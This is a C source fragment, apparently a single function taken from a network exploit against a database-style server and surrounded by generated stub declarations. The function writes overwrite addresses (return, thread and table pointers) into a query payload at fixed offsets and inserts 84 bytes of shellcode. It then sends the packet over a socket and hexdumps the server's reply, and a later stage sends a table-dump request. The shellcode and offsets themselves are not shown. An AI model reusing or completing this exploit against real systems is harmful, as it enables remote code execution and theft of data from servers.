
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int RET_POS ;
 int SHL_POS ;
 int TBL_POS ;
 int THD_POS ;
 char* addr_ret ;
 char* addr_tbl ;
 char* addr_tdh ;
 char* buf ;
 int d ;
 int dump_packet_len ;
 int exit (int) ;
 int fd ;
 scalar_t__ hexdump ;
 scalar_t__ isprint (unsigned char) ;
 int memset (char*,int ,int) ;
 int payload_len ;
 int perror (char*) ;
 int printf (char*,...) ;
 char* query_payload ;
 int recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 char* shcode ;
 char* table_dump_packet ;
 int tbl ;
 int thd ;
 int tmp_idx ;

int
sendit (char *buf1, int fdest, int dblen)
{
  int len1;
  int i = 0;
  int ret = 0;
  printf ("%d\n", d);
  if (d == 2)
    {

      int o;
      int position = 14;

      tmp_idx = 3;


      int ret = tbl - 0x106 + 33;

      for (i = 0; i < 32; i += 8)
 addr_ret[tmp_idx--] = (ret >> i) & 0xff;

      tmp_idx = 3;
      for (i = 0; i < 32; i += 8)
 addr_tdh[tmp_idx--] = (thd >> i) & 0xff;

      tmp_idx = 3;
      for (i = 0; i < 32; i += 8)
 addr_tbl[tmp_idx--] = (tbl >> i) & 0xff;
      printf ("ret %x\n", ret);



      tmp_idx = 0;
      for (o = THD_POS; o > THD_POS - 4; o--)
 query_payload[o] = addr_tdh[tmp_idx++];

      tmp_idx = 0;
      for (o = TBL_POS; o > TBL_POS - 4; o--)
 query_payload[o] = addr_tbl[tmp_idx++];

      tmp_idx = 0;
      for (o = RET_POS; o > RET_POS - 4; o--)
 query_payload[o] = addr_ret[tmp_idx++];
      tmp_idx = 0;
      for (o = SHL_POS; o < SHL_POS + 84; o++)
 query_payload[o] = shcode[tmp_idx++];

      printf ("entro\n");
      buf1 = query_payload;
      len1 = payload_len;
    }
  else if (d >= 3)
    {
      printf ("entro\n");


      buf1 = table_dump_packet;
      if (dblen >= 0)
 buf1[5] = (char) dblen;
      printf ("%x", (char) dblen);
      len1 = dump_packet_len;
    }
  d++;

  printf ("\nClient -> Server\n");
  if (hexdump)
    {
      for (i = 0; i < len1; i++)
 printf (" %.2x%c", (unsigned char) buf1[i],
  ((i + 1) % 16 ? ' ' : '\n'));
      printf ("\n");
      for (i = 0; i < len1; i++)
 {
   unsigned char f = (unsigned char) buf1[i];
   printf (" %.2c%2c", (isprint (f) ? f : '.'),
    (((i + 1) % 16) ? ' ' : '\n'));
 }
    }
  if (send (fd, buf1, len1, 0) != len1)
    {
      perror ("cli: send(buf3)");
      exit (1);
    }



  fdest = fd;

  memset (buf, 0, 65535);
  ret = recv (fdest, buf, 65535, 0);
  printf ("\nServer -> Client\n");
  if (hexdump)
    {
      for (i = 0; i < ret; i++)
 printf (" %.2x%c", (unsigned char) buf[i],
  ((i + 1) % 16 ? ' ' : '\n'));
      printf ("\n");
      for (i = 0; i < ret; i++)
 {
   unsigned char f = (unsigned char) buf[i];
   printf (" %.2c%2c", (isprint (f) ? f : '.'),
    ((i + 1) % 16 ? ' ' : '\n'));
 }
    }
  else
    {
      printf ("\n%s\n", buf + 5);
    }



  return 0;
}
